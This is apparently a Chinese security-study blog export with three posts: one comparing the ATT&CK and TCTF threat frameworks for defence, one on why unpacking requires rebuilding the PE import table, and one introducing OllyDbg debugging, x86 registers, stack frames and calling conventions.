<p><code>Pre-ATT&amp;CK</code>对应杀伤链的<strong>前两阶段</strong>；<code>企业ATT&amp;CK</code>对应杀伤链的<strong>后五阶段</strong>。鉴于<code>ATT&amp;CK框架</code>侧重于<strong>“突破后”防御</strong>，因此，相比于Pre-ATT&amp;CK，<strong>企业ATT&amp;CK是ATT&amp;CK框架的主体内容</strong>。这一点，也正符合APT攻防对抗的现实状况。对于以APT作业为主要形式的网空威胁，边界和预设的防御措施，总会被突破；因此，认知与防御APT威胁的要点，<strong>应以“敌已在内”为敌情想定的基础</strong>，强化网络内部的威胁防御。具体地，企业ATT&amp;CK还可再进一步依据执行环境而细分为<code>Windows版、Linux版、MacOS版</code>以及<code>云计算（Cloud）</code>版（其下又具体对应若干种不同云平台环境），其中，又以Windows版为重点。除此之外，还有适用于<code>移动（Mobile）环境</code>的版本。</p>
<p>对于<code>企业ATT&amp;CK</code>，网空威胁所涉及的对手战术与技术，汇总形成<code>一个矩阵（Matrix）</code>，即ATT&amp;CK框架的知识库。该矩阵形式的知识库是<strong>ATT&amp;CK框架的知识主体</strong>，也是进一步扩展形成其它分析工具、分析方法与分析资源的知识基础。知识库矩阵的总貌如下图所示。</p>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//image20200617-4.png" alt="img"></p>
<p>该矩阵中列举了<strong>12项攻击战术</strong>，如“初始访问”、“执行”和“持久化”；需要注意的是，这12项攻击战术<strong>并不限定执行的时间或先后顺序</strong>，攻击者可以按任意顺序来组合运用这12项攻击战术。</p>
<p>在每一战术下，包含<strong>可支持此战术的攻击技术</strong>；例如，为达成战术“初始访问”，可运用技术“水坑攻击”、“通过可移动介质复制”或“使用鱼叉式钓鱼附件”。如果需要了解某一具体攻击战术或攻击技术的细节，可访问<a href="https://attack.mitre.org/">MITRE网站</a>。在攻击技术的细节说明中，包含此项攻击技术的定义与描述，也包含与检测此项攻击技术密切关联的信息如数据来源，还包含此项攻击技术被哪些APT组织所采用，以及其它技术性细节信息。</p>
<blockquote>
<p> <strong>如何使用ATTCK框架</strong>？见下。</p>
</blockquote>
<ul>
<li><p><strong>检测分析方面</strong>，ATT&amp;CK框架可指导<strong>如何防御某一具体攻击技术</strong>。对于特定的攻击技术，知识库给出了诸如检测方法、缓解措施以及<strong>检测所需数据源</strong>等信息；防御者可依据相关信息，部署对应的<strong>数据传感器</strong>，分析捕获的数据以实施有效的检测。</p>
</li>
<li><p><strong>威胁情报的利用</strong>方式是灵活多样的；通过威胁框架，能够将<strong>威胁情报结构化，便于对APT报告的理解</strong>，以及通过威胁情报提升防御。例如，可通过攻击战术技术在矩阵中的映射状态，来分析APT组织。由于不同APT组织的作业方式各不相同，其所采用的战术技术集合也各不相同、且具有相对稳定的特点，因此，基于矩阵映射状态的分析，可区别不同的APT组织，跟踪特定APT组织的战术技术变化，从而针对性地调整防御措施。</p>
</li>
<li><p><strong>对手仿真</strong>的主要目的，在于可靠检验防御措施对真实APT攻击的有效性。</p>
</li>
<li><p><strong>评估与工程</strong>，则依托威胁框架改变了防御差距评估缺乏明确指标的模糊性问题。通过验证防御措施对攻击技术的覆盖范围与覆盖深度，防御差距评估具有了<strong>清晰的“可见性”</strong>，使得防御方能够避免盲目性，有的放矢地优化防御部署、聚焦防御重点，从而更为有效地提升防御水平。</p>
</li>
</ul>
<blockquote>
<p>ATTCK框架的<strong>扩展资源</strong>：</p>
</blockquote>
<p><code>CAR (Cyber Analytics Repository，网空分析库)</code>从防御者角度形成对ATT&amp;CK知识库的有效利用。对应ATT&amp;CK知识库中所列举的<strong>每一攻击技术，CAR都说明了对应的分析方法</strong>（包括如何实现的伪代码描述）、数据模型以及如何收集数据。</p>
<p><code>Navigator（导航器）</code>是一个便捷的在线工具，可将威胁情报中获取的攻击者战术技术在知识库矩阵中进行标注，以辅助分析攻击者组织。</p>
<p><code>ART（Atomic Red Team）</code>是第三方开发的映射到ATT＆CK框架的小型、高度可移植的<strong>检测测试库</strong>；防御者可选择要测试的攻击技术，利用测试库生成测试程序并执行测试，通过分析对该测试程序的检测结果，来达到改善防御的目的。</p>
<p><code>Mitigations（缓解库）</code>则专门提供对攻击技术予以缓解的指导措施；例如，如何设置账号管理策略，以阻断对账号密码的暴力破解攻击。除此之外，大量丰富的专家资源与解决案例，都提供了对安全实践的有效帮助，是ATT&amp;CK框架得以广泛运用的强大助力。</p>
<h2 id="TCTF框架"><a href="#TCTF框架" class="headerlink" title="TCTF框架"></a>TCTF框架</h2><blockquote>
<p> 当前的TCTF框架是NSA于2018年11月发布的第二版。通过参考网空杀伤链、ATT&amp;CK等多种现有威胁框架，TCTF框架<strong>以阶段（Stage）、目标（Objective）、行为（Action）和关键短语（Key Phrases）</strong>所组成的四层描述结构，构造了一个与网空行为活动紧密结合的通用技术词典。</p>
</blockquote>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//image20200617-5.png" alt="img"></p>
<p><strong>阶段</strong>：TCTF将<strong>攻击行动划分为6个阶段</strong>，分别是“行动管理与资源保障、目标勘察与环境整备、接触目标与进攻突防、持久化驻留潜伏、致效能力运用、全程持续支撑作业”。</p>
<p><strong>创新</strong>：这一阶段划分，既有与网空杀伤链相同之处，也有不同之处。例如，阶段“行动管理与资源保障”实际已超出单纯的网空专业技术范畴和窄带的攻防行动范畴，涉及到组织、资金、规划计划等战略性作业筹划。再例如，特别强调在对方网络内部的持久潜伏与持续存在，而不仅仅只是为了达成某种破坏性目标，这突出显示了情报作业的典型特质。通过隐蔽渗透与持续监控搜集，形成对对方网络的深远控制和无形威慑，并能够在任何需要的时刻，立即由网空情报刺探行动（即CNE，Computer Network Exploitation）转换为网空军事进攻行动（即CAN，Computer Network Attack）。</p>
<p><strong>目标与行为</strong>：分属于上述6个阶段的，是<strong>各个阶段所要达成的目标</strong>，这些目标<strong>共计有21个</strong>，与此21个目标相关联，则包含<strong>188种可达成目标的行为</strong>。</p>
<p>TCTF对阶段、目标和行为都给出了细致的定义描述。举例来说，在意图获得受害者的物理或虚拟计算机、信息系统、网络和数据存储的访问权限而进行的“接触目标与进攻突防”阶段，为了达成通过技术、认知、物理手段向被攻击对象投递恶意载荷的“投递”目标，可采取“发送恶意邮件”行为以在电子邮件中嵌入恶意附件或链接。</p>
<p><strong>关键短语</strong>：针对行为，进一步<strong>通过关键短语来施加更多的特征细化描述</strong>，从而形成第4层分析结构。例如，“发送恶意邮件”行为所包含的关键短语有“鱼叉式网络钓鱼、网络捕鲸、恶意附件、iFrame、嵌入式代码等等”。</p>
<p>s所有的分析层次，包括阶段、目标、行为和关键短语，均不涉及环境约束，也不具体限定检测规则和数据传感。可见，TCTF框架是定义在网空威胁技术语境中，虽与网空安全行业的定义紧密结合，但又脱离了具体执行约束，从而<strong>适合于上下沟通</strong>（比如政府管理部门与安全厂商之间的沟通）。</p>
<h2 id="二者的区别"><a href="#二者的区别" class="headerlink" title="二者的区别"></a>二者的区别</h2><p>总体来看，<code>ATT&amp;CK框架</code>与<code>TCTF框架</code>，都提供<strong>对网空威胁的标准化定义、分类描述和特征刻画</strong>，都可用于威胁信息的共享，以及支持对威胁的预测、分析，进而可指导防御有效性的提升。但二者又具有显著的不同，主要体现在三个方面的差异性。</p>
<ul>
<li><strong>背景意图方面</strong>。设计者不同的身份背景，决定了其所看待网空对抗的视野、所关注的利益焦点、所侧重的威胁分析要素。因此，<strong>MITRE作为民间研究机构</strong>，必然与作为<strong>情报机构的NSA</strong>，具有不同的威胁框架设计意图，所想定的框架的作用领域也各不相同。<strong>ATT&amp;CK框架专注于攻击技术的解析</strong>，面向安全实践领域或操作实施层面。<strong>TCTF框架旨在提供更广范围的沟通</strong>，在操作实施、任务流程、组织策略等多个层面上，加强不同工作角色和知识背景人员之间的协作，方便安全客户对网络威胁活动的理解，以及推动高层决策的制定。</li>
<li><strong>结构内容方面</strong>。二者所覆盖的<strong>攻击作业范畴不同</strong>：ATT&amp;CK框架只涵盖攻击作业全生命周期的<strong>突破后部分</strong>，而TCTF框架<strong>不但包含全部的攻击作业周期，还涉及到供应链、甚至非网空攻击行动</strong>。二者的核心概念不同：ATT&amp;CK框架<strong>完全围绕TTP</strong>，而TCTF框架则通过<strong>阶段、目标、行为、关键短语</strong>来有效支撑层次化的分析结构。细节粒度与提炼程度不同：ATT&amp;CK框架具有<strong>丰富的技术操作性细节</strong>，强化了对具体攻击行为的分析准确性和辨识力；TCTF框架的细化则侧重于<strong>拆解攻击动作以实现对各种可能的攻击行为的全面覆盖</strong>，但其技术特征刻画并不包含与具体攻击直接关联的操作性细节。</li>
<li><strong>应用发展方面</strong>。ATT&amp;CK日益被越来越多的安全厂商所支持，而TCTF则普遍应用于美方情报系统中，二者都具有广泛的现实应用。由于ATT&amp;CK突出对APT攻击的实时跟踪与技术提炼，因此，<strong>ATT&amp;CK会保持较快的知识库更新速度</strong>，并可能会响应某些困难问题而作出结构和内容上的较大调整。对于TCTF而言，攻击作业手法的分类、以及脱离具体执行约束的特征刻画，会保持<strong>相对长期的稳定</strong>，预计不会进行频繁的更新。</li>
</ul>
<p>应该意识到，二者差异的存在，并不会形成对威胁协同分析的障碍。恰恰相反，差异性提供了分析能力互补与安全价值叠加的途径。</p>
<h1 id="如何利用威胁框架"><a href="#如何利用威胁框架" class="headerlink" title="如何利用威胁框架"></a>如何利用威胁框架</h1><p>利用威胁框架可以进行以下方面的应用：</p>
<ul>
<li>分析攻击行为与威胁发展态势、指导攻击者模拟、跟踪特定对手的技术集合、检测&#x2F;缓解攻击者着重使用的技术</li>
<li>分析防御差距、评价安全技术，优化安全部署</li>
</ul>
<p>无论是<code>ATT&amp;CK框架</code>，还是<code>TCTF框架</code>，二者均是梳理高&#x2F;超高能力网空威胁行为体攻击活动的有效框架方法和工程体系。</p>
<p>从威胁框架出发，<strong>分析威胁所采用的战术、技术，推演威胁所关联的阶段、目标与行为</strong>，无论是对威胁事件和威胁行为体进行<strong>深度分析</strong>，还是评估当前防御体系能力及相关<strong>防御机制</strong>的有效性，指导形成体系化的防御规划与建设目标，都是不无裨益的。</p>
<p>二者可以<strong>协同作用、互补互益</strong>：</p>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231013153750388.png" alt="image-20231013153750388"></p>
<p>利用<code>ATT&amp;CK框架</code>，完成网空威胁在<strong>技术层面的分析</strong>，实现防御技术的优化改善。与网空威胁相关的事件捕获、情报线索以及研究发现等技术性信息，通过ATT&amp;CK框架而<strong>完成对攻击者战术、技术等要素的解析提炼</strong>，依据解析结果而<strong>指导防御能力的优化提高</strong>；例如，对特定攻击技术防御的优先级，可采取的有效的检测分析方法，等等。</p>
<p>与此同时，在网空对抗大背景下，考虑大国博弈、地缘政治、产业竞合等更为广泛的因素以及更为根本的动机，运用<code>TCTF框架</code>，对高&#x2F;超高能力网空威胁行为体发起的APT攻击作业，在<strong>作业意图、行为、能力水平、危害程度</strong>等方面，作出更为全面深入的分析研判，有效<strong>支撑情报与决策体系</strong>应对网空威胁，以满足更高层次的安全需求、维护更为广泛的安全利益。</p>
]]></content>
      <categories>
        <category>【-专业知识-】恶意代码分析与处置</category>
        <category>处置方法论</category>
      </categories>
      <tags>
        <tag>ATT&amp;CK</tag>
        <tag>威胁框架</tag>
      </tags>
  </entry>
  <entry>
    <title>PE文件加载解疑</title>
    <url>/2023/10/01/%5B%E2%88%9A%5D%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-PE%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BD%E8%A7%A3%E7%96%91/</url>
    <content><![CDATA[<p><strong>疑点</strong>：为什么脱壳要重构导入表，脱壳存根不是已经进行iat表的恢复了吗？</p>
<p><strong>解决方法</strong>：理解PE文件正常加载的流程与脱壳存根加载的流程，比较不同。同时针对性找文章。</p>
<h1 id="输入表的作用与流程"><a href="#输入表的作用与流程" class="headerlink" title="输入表的作用与流程"></a>输入表的作用与流程</h1><blockquote>
<p>在分析为什么脱壳要重构IAT之前，我们需要先了解导入表的基本知识，这很重要。</p>
</blockquote>
<p>具体的导入表结构就不多说，PE文件详解的blog里已经有过详细介绍，所以下面主要从解决问题的方向出发。</p>
<p><strong>首先区分几个概念</strong>：IT、INT、IAT。细分说来就是导入表、导入名称表、导入地址表。</p>
<p>上三者中，导入表包含导入名称表和导入地址表，及导入表中有两个字段指向INT与IAT。而INT的主要作用是告诉加载器该DLL都加载了哪些函数，通过具体的函数名称或者序号实现；IAT的作用是存储导入函数的实际内存地址（程序调用函数就是通过指向IAT的具体表项来实现的），当然在程序没有加载之前该表与INT表指向相同的数组。</p>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20230831101111817.png" alt="image-20230831101111817"></p>
<p>晓得了导入表的结构，下面简单捋一遍<strong>PE文件加载时的流程</strong>：</p>
<p>PE文件的加载是由PE加载器完成的，PE加载器会先搜索OriginalFirstThunk，之后会迭代搜索数组的指针，也就是最终获取到具体函数的名称，然后会通过函数名称（或者序号）获取到该函数在内存中的实际地址（只有程序加载后才可以知晓），最终将该地址填写到IAT对应表项中，实现地址的重写保证程序的正常运行。</p>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20230831102103488.png" alt="image-20230831102103488"></p>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20230831102539369.png" alt="image-20230831102539369"></p>
<blockquote>
<p><strong>小结</strong>：在没有加壳情况下，PE文件的加载是通过PE加载器完成的，这个过程中需要根据导入表完成IAT表的重写，保证该表项对应的数据是函数的实际内存地址。</p>
</blockquote>
<h1 id="脱壳与输入表"><a href="#脱壳与输入表" class="headerlink" title="脱壳与输入表"></a>脱壳与输入表</h1><p>学习了前面的知识，其实答案就已经明了了：为什么脱壳时要重建导入表呢，因为一个<strong>正常的PE文件的加载需要导入表来完成IAT的重写</strong>。</p>
<p>但是脱壳存根在进行文件加载时并不需要完整的导入表，因为他是通过显式装载调用DLL的方式获取各个函数的地址并重写IAT。（例如getprocaddress函数），所以一个加壳程序在执行时可能<strong>不会在内存中出现导入表</strong>（多是一个个函数名称的字符串），这时候就要通过<strong>IAT表重建导入表</strong>了。</p>
<p>导入表的重建具体可以看《加密与解密》-脱壳篇，这里不再赘述。</p>
]]></content>
      <categories>
        <category>【-专业知识-】逆向工程知识</category>
        <category>基础知识补充</category>
      </categories>
      <tags>
        <tag>PE结构</tag>
        <tag>解疑</tag>
      </tags>
  </entry>
  <entry>
    <title>代码逆向基础</title>
    <url>/2023/09/11/%5B%E2%88%9A%5D%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86-%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="关于逆向工程"><a href="#关于逆向工程" class="headerlink" title="关于逆向工程"></a>关于逆向工程</h1><p><strong>分析方法：</strong></p>
<p><strong>静态分析与动态分析</strong>，二者结合相辅相成。</p>
<ul>
<li>静态看类型、PE文件信息、壳信息、字符串、API + IDA Pro源码</li>
<li>动态看行为监控 + 动态调试</li>
</ul>
<p>先静态-推测程序结构与行为机制，再动态-找切入点，如DLL的main、关键API调用等。</p>
<p><strong>两个概念：</strong></p>
<ul>
<li>patch：打补丁，即对应用程序文件或者进程内存进行修改</li>
<li>Crack：破解，与Patch类似，但是意图非法</li>
</ul>
<p>前者目的在于修复漏洞、后者在于破解软件；而二者应用的技术就是逆向工程。而学习的内容是<strong>逆向技术原理</strong>与<strong>OS内部体系结构</strong>。</p>
<h1 id="简单逆向分析"><a href="#简单逆向分析" class="headerlink" title="简单逆向分析"></a>简单逆向分析</h1><blockquote>
<p>以OD为例，简单实例分析。</p>
</blockquote>
<p><strong>入口点</strong>：</p>
<p>当使用OD打开可执行文件后，会跳转到EP位置进行执行。需要注意的是<strong>这个地址不是main函数</strong>，而某些程序的<strong>启动代码</strong>，这些代码随着编译器的不同而变化。</p>
<p><strong>回顾一下基础的指令</strong>：</p>
<ul>
<li><code>Ctrl+G</code>：地址的跳转，包括代码窗口与内存窗口</li>
<li><code>F2</code>：断点（软）</li>
<li><code>Ctrl+F2</code>：重新加载调试</li>
<li><code>F4</code>：运行到指定位置。利用的是<strong>硬件断点</strong>。</li>
<li><code>F7</code>：单步步入</li>
<li><code>F8</code>：单步步过</li>
<li><code>F9</code>：多步步过（到下一个断点）</li>
<li><code>Ctrl+F9</code>：执行到返回</li>
<li><code>：</code>：添加标签（修改替换）</li>
<li><code>；</code>：添加注释</li>
<li><code>*</code>：回到EIP</li>
<li><code>Enter</code>：查看call、jmp后续</li>
<li><code>ALT+B</code>：查看断点窗口</li>
<li><code>ALT+L</code>：查看日志窗口</li>
<li><code>Ctrl+E</code>：数据窗口快速编辑</li>
</ul>
<p>下面介绍几种<strong>快速定点的方法</strong>：</p>
<blockquote>
<p>所谓的快速定点就是<strong>在调试过程中添加人为标记</strong>，便于整个流程分析与复盘。</p>
</blockquote>
<ol>
<li><p><code>Ctrl+G</code>  AND  <code>F4</code></p>
<p>上面的指令都有涉及到，前者用于地址的跳转，后者用于执行到光标位置。所以二者结合可以实现在某个位置开始调试。</p>
<img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20230915131948649.png" alt="image-20230915131948649" style="zoom:50%;" />


</li>
<li><p><strong>设置断点</strong>（后续具体介绍，是最常用的一种调试手段）</p>
<p>断点的种类很多，比如<code>硬件断点、软件断点、内存断点、条件断点</code>等，设置断点的方法也很多，比如在<code>某位置使用F2</code>或者通过<code>Ctrl+N</code>利用导入表设置；使用<code>ALT+B</code>可以打开断点窗口，查看或跳转到某断点。</p>
<img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20230915133432002.png" alt="image-20230915133432002" style="zoom:50%;" />
</li>
<li><p><strong>添加注释</strong>：</p>
<p>通过使用<code>；</code>可以在指定位置添加注释，而后使用<code>右键查找-用户注释</code>即可查看。</p>
<img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20230915134008932.png" alt="image-20230915134008932" style="zoom:50%;" />
</li>
<li><p><strong>设置标签</strong>：</p>
<p>可以通过<code>：</code>设置标签，即在指定地址添加特定的名称。也可以在上图位置进行查看设置的所有标签。</p>
</li>
</ol>
<p>下面介绍几种<strong>快速查找指定代码的方法</strong>：以查找messageBox所在的main函数为例。</p>
<ol>
<li><p><strong>极限F8法</strong>：</p>
<p><strong>适用场景</strong>：功能明确，代码简单</p>
<p><strong>具体方法</strong>：确定大本营后，连续使用F8，直到跳出窗口，则该函数就是main函数，可以设置标记（断点、标签等）</p>
</li>
<li><p><strong>字符串检索法</strong>：</p>
<p>OD在加载文件时会先进行预分析，将使用到的字符串、API等单独列出，使用可以通过这种方法查询指定字符串。如下图，通过查看<code>helloworld</code>字符串即可定位到main函数。</p>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20230915135401523.png" alt="image-20230915135401523"></p>
</li>
<li><p><strong>API检索法</strong>：</p>
<p>通过查看该程序的<strong>函数调用列表</strong>，找到messageBox函数。</p>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20230915135748091.png" alt="image-20230915135748091"></p>
</li>
<li><p><strong>模块与导入函数法</strong>：</p>
<p>通过右键-查找-所有模块，之后通过名称查询即可。</p>
<img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20230915140355811.png" alt="image-20230915140355811" style="zoom:50%;" /></li>
</ol>
<p>前面介绍了如何设置定位点、如何查找指定API，下面学习在<strong>找到指定代码后如何进行修改</strong>。</p>
<ol>
<li><p><strong>直接修改内存内容</strong>。</p>
<p>通过<code>Ctrl+G</code>跳转到指定的内存区域，使用<code>Ctrl+E</code>进行编辑。注意要加00结尾。</p>
<img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20230915141253299.png" alt="image-20230915141253299" style="zoom:50%;" />

<img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20230915141309494.png" alt="image-20230915141309494" style="zoom: 50%;" />
</li>
<li><p><strong>修改传递参数。</strong></p>
<p>新建一个字符串，之后修改<code>messageBox</code>的参数即可，使用<strong>空格修改汇编代码</strong>。</p>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20230915142022834.png" alt="image-20230915142022834"></p>
</li>
</ol>
<h1 id="字节端序"><a href="#字节端序" class="headerlink" title="字节端序"></a>字节端序</h1><p>什么是字节序呢？简单来说就是<strong>多字节数据在内存或者网络中的排序方式</strong>。</p>
<p>可以分为两种字节序：</p>
<ul>
<li><strong>大端序</strong>：内存低位地址存储数据的高位，多是网络协议中使用。</li>
<li><strong>小端序</strong>：内存低地址存储数据的低位，多少Intel x86CPU使用，也是后面学习使用的。</li>
</ul>
<p>怎么记忆呢？记住一种即可：<strong>高对高逆序存储</strong> &#x3D; <strong>契合</strong> &#x3D; <strong>广泛</strong> &#x3D; <strong>小端</strong>。</p>
<h1 id="IA-32寄存器学习"><a href="#IA-32寄存器学习" class="headerlink" title="IA-32寄存器学习"></a>IA-32寄存器学习</h1><blockquote>
<p>调试过程中涉及的寄存器很多，在不断学习中不断总结。本次学习<strong>基本程序运行寄存器</strong>。</p>
<p>其他寄存器：内存寄存器、调试寄存器、控制寄存器，非IA-32架构的寄存器，后续学习都会涉及。</p>
</blockquote>
<p><strong>简单分类</strong>：</p>
<ul>
<li><strong>通用寄存器</strong>：用于<strong>数据的存储与传输</strong>。一共8个：<code>eax、ebx、ecx、edx、esp、ebp、esi、edi</code></li>
<li><strong>段寄存器</strong>：用于存储段描述符，与SDT一起完成虚拟内存的构建与段机制的完成。一共6个，16位：<code>CS、DS、SS、ES、FS、GS</code>。</li>
<li><strong>标志寄存器</strong>：用于标识<strong>状态信息</strong>，32位、按位起作用。</li>
<li><strong>指令指针寄存器</strong>：存储<strong>下一条指令的地址</strong>，32位、EIP。</li>
</ul>
<img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20230915154939168.png" alt="image-20230915154939168" style="zoom:50%;" />



<p><strong>细致介绍</strong>：</p>
<ol>
<li><p><strong>通用寄存器</strong>：<code>eax、ebx、ecx、edx、esp、ebp、esi、edi</code></p>
<p><strong>概况</strong>：最常用的几个寄存器，要熟悉其用法。</p>
<p><strong>具体功能介绍</strong>：</p>
<ul>
<li><p><code>EAX</code>：累加器add。多用于保存函数返回结果。</p>
</li>
<li><p><code>EBX</code>：基址寄存器base。多用于记录数据基址。</p>
</li>
<li><p><code>ECX</code>：计数器count。多用于计数，比如循环中使用其保存i。</p>
</li>
<li><p><code>EDX</code>：数据寄存器data。血统最纯，记录重要数据。</p>
</li>
<li><p><code>ESP</code>：栈顶指针寄存器，保存栈顶指针，很重要，在函数调用、栈帧机制中。</p>
</li>
<li><p><code>EBP</code>：扩展基址指针寄存器，用于SS表示的栈区，记录某个栈帧的基址。</p>
</li>
<li><p><code>ESI</code>：源地址寄存器，多用于内存复制。</p>
</li>
<li><p><code>EDI</code>：目的指针寄存器，多用于内存复制。</p>
</li>
</ul>
</li>
<li><p><strong>段寄存器：</strong><code>CS、SS、DS、ES、FS、GS</code></p>
<p><strong>概况</strong>：16位寄存器，存储的不是段的地址，而是<strong>SDT的索引</strong>。（SDT是段描述符表，下面有介绍）</p>
<p><strong>具体介绍</strong>：</p>
<ul>
<li><p><code>CS</code>：代码段寄存器</p>
</li>
<li><p><code>SS</code>：栈段寄存器</p>
</li>
<li><p><code>DS</code>：数据段寄存器</p>
</li>
<li><p><code>ES</code>：附加段寄存器</p>
</li>
<li><p><code>FS</code>：数据段寄存器，这个寄存器很重要，后续学习<code>SEH(异常处理机制)</code>、<code>TEB、PEB（环境块）</code>时会用到。</p>
</li>
<li><p><code>GS</code>：数据段寄存器</p>
</li>
</ul>
<p><strong>扩展</strong>：段描述符表（Segment Descriptor Table）</p>
<p>​        <strong>段描述符表（Segment Descriptor Table）</strong>是指在x86架构的计算机体系结构中使用的数据结构，用于管理和描述内存中的各个段（segment）。</p>
<p>​        在x86架构中，内存被划分为多个段，每个段具有不同的权限和属性。<strong>段描述符表存储了这些段的描述符</strong>，每个描述符包含了<code>段的基地址（base address）</code>、<code>段的大小（segment size）</code>、<code>访问权限（access rights）</code>和<code>其他属性信息</code>。</p>
<p>​        段描述符表通常是一个数组或者表格的形式，每个表项对应一个段描述符。处理器使用<code>段选择子（Segment Selector）</code>来索引段描述符表，从而找到对应的段描述符。当程序引用一个内存地址时，处理器会根据段选择子找到对应的段描述符，然后使用其中的信息来执行相应的访问控制和内存管理操作。</p>
<p>​        需要注意的是，自从Intel引入了64位的x86架构（x86-64或AMD64），段描述符表的使用已经不再是必须的，因为<strong>64位模式下的内存管理采用了平坦模型</strong>（<code>Flat Model</code>），即所有的内存被视为单一的连续空间，不再划分为不同的段。然而，段描述符表仍然在兼容性模式下使用，以支持32位的应用程序和操作系统。</p>
<p><strong>补图：</strong></p>
<img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20230915161314878.png" alt="image-20230915161314878" style="zoom:50%;" />
</li>
<li><p><strong>标志寄存器：</strong></p>
<p><strong>概况</strong>：这个寄存器用于记录状态信息，是以bit为单位的。</p>
<p>功能：不需要记住所有的标志位含义，只需要知道其中的三个。</p>
<ul>
<li><p><code>ZF</code>：zero flag，零标志位，若该寄存器为1，则表示结果为0.</p>
</li>
<li><p><code>OF</code>：overflow flag，溢出标志位，若该值为1，则表示有符号整数溢出。</p>
</li>
<li><p><code>CF</code>：Carry flag，进位标志位，若该值为1，则表示无符号整数溢出。</p>
</li>
</ul>
<p><strong>歌曰</strong>：标志位寄存器经常与<strong>条件跳转</strong>关联，比如<code>JNZ、JZ</code>等，根据ZF标志位的结果决定是否跳转；而在判断之前会通过<code>test、cmp</code>等指令为<strong>标志位赋值</strong>。</p>
</li>
<li><p><strong>指令指针寄存器：</strong>EIP，存储下一条指令的地址。</p>
</li>
</ol>
<h1 id="栈与栈帧"><a href="#栈与栈帧" class="headerlink" title="栈与栈帧"></a>栈与栈帧</h1><blockquote>
<p>理清关键概念定义，用自己的话。</p>
</blockquote>
<p><strong>当曰</strong>：什么是栈？</p>
<p><strong>歌曰</strong>：栈是一种数据结构，遵循<strong>先入后出</strong>的数据存储原则。具体到虚拟内存空间，栈是其中一段连续的地址，向着<strong>低地址方向增长</strong>，通过<code>PUSH</code>和<code>POP</code>实现压栈和弹栈。</p>
<hr>
<p><strong>当曰</strong>：那栈有什么用嘞？</p>
<p><strong>歌曰</strong>：那当然有用。栈与程序的执行过程密切相关，因为程序就是各个函数的组合，而每一个<strong>函数的状态变化便是通过栈记录的</strong>。具体来说，栈有以下<strong>三个作用</strong>：</p>
<ol>
<li><strong>参数的传递</strong>：在函数执行之前，会先传递参数，以供函数内部调用。（64位程序采取寄存器传参）</li>
<li><strong>状态的记录</strong>（上下文信息）：在函数执行完毕后要返回，所以要知道函数执行前的状态信息，比如关键寄存器的数据、要返回的地址等。</li>
<li><strong>局部变量的存储</strong>：局部变量只有在函数内部起作用，如何实现呢，只需要在栈里创建该变量即可，不需要在数据段。</li>
</ol>
<hr>
<p><strong>当曰</strong>：什么是栈帧？</p>
<p><strong>歌曰</strong>：栈帧可以看作是栈区一小段空间，<strong>每一个栈帧都对应一个函数调用</strong>。当函数调用时要先开辟栈帧，由<code>EBP</code>指向栈帧底部、<code>ESP</code>指向栈帧顶部。栈帧的作用就是管理函数调用过程中的<strong>参数、局部变量、返回值、上下文信息</strong>。</p>
<p><strong>当曰</strong>：如何管理呢？</p>
<p><strong>歌曰</strong>：程序利用<code>EBP寄存器</code>访问<strong>栈内局部变量、参数、函数返回地址</strong>等信息。通过使用栈帧，计算机可以有效地管理函数调用和返回的过程，确保函数之间的<strong>数据隔离</strong>和正确的<strong>执行顺序</strong>。</p>
<h1 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h1><blockquote>
<p>函数调用约定就是指函数在指向过程中，<code>参数如何被调用</code>的约定。具体来说，无外乎两个方面，即<strong>参数如何传递</strong>、<strong>函数结束后参数如何销毁</strong>。</p>
</blockquote>
<p>在介绍具体的调用约定之前，先来说一下当函数执行完毕后<strong>栈里的数据怎么处理</strong>？答案就是：<strong>不处理</strong>。因为处理是需要花费资源的，所以一般的做法是<strong>只改变EBP和ESP的值</strong>，即修改栈的大小；后续<strong>使用栈时直接覆盖</strong>即可。</p>
<p>下面具体说下目前使用最多的<strong>三种调用约定</strong>：</p>
<ul>
<li><code>cdecl</code>：<strong>C语言默认</strong>的调用约定，由<strong>调用者</strong>进行栈平衡操作，参数由栈进行传递。这种方法的好处是可以传递可变长度的参数，更加灵活，其栈平衡操作通常是调用者使用<code>add esp,xx</code>进行。</li>
<li><code>stdcall</code>：<strong>WIN32 API默认</strong>使用的调用约定，由<strong>被调用者</strong>进行栈平衡操作，参数由栈进行传递。这种方法的好处代码尺寸小，其栈平衡操作通过是使用<code>RETN</code>完成的，即<code>ret与 pop N</code>。</li>
<li><code>fastcall</code>：与<code>stdcall</code>类似，不同的是前面几个参数使用<strong>寄存器传递</strong>，所以执行速度更快。</li>
</ul>
<blockquote>
<p> 后续学习</p>
</blockquote>
<p>切记不要急躁，切记不要蜻蜓点水，切记不要眼高手低。</p>
